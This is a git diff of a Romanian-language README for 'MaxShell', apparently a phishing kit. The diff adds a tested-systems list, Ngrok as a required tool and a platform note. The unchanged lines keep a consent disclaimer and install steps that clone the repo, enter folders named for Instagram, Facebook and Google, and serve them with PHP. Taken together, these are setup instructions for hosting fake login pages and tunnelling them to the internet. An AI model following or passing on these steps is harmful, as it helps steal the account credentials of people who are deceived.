@@ -9,9 +9,19 @@ Utilizarea Scriptul MaxShell pentru a ataca ținte fără acordul reciproc preal
 ![Captură de ecran de la 2022-01-12 20-43-31](https://user-images.githubusercontent.com/93870894/149202850-6bf6f1c7-2d95-4c9e-af96-755c06a0a69f.png)
 ![Captură de ecran de la 2022-01-12 20-43-39](https://user-images.githubusercontent.com/93870894/149202860-b1846f51-9ef3-46cb-855e-643ba7e78417.png)
 
-## $ instalare
+## $ Instalare
 git clone https://github.com/hacking12345678/MaxShell.git
 <br>cd MaxShell
 <br>ls
 <br>cd instagram,facebook,google
 <br>php -S localhost:???? < port
+## $ Testat
+<br> 1)ubuntu 21.10
+<br> 2)kali-linux
+<br> 3)Fedora
+<br> 4)Parrot OS
+##  $ Microsoft
+### Obligatoriu instalarea aplicaţile
+<br> 1)Ngrok
+<br> 2)Visual Studio Code
+# Pe Android,Ios nu funcţionează
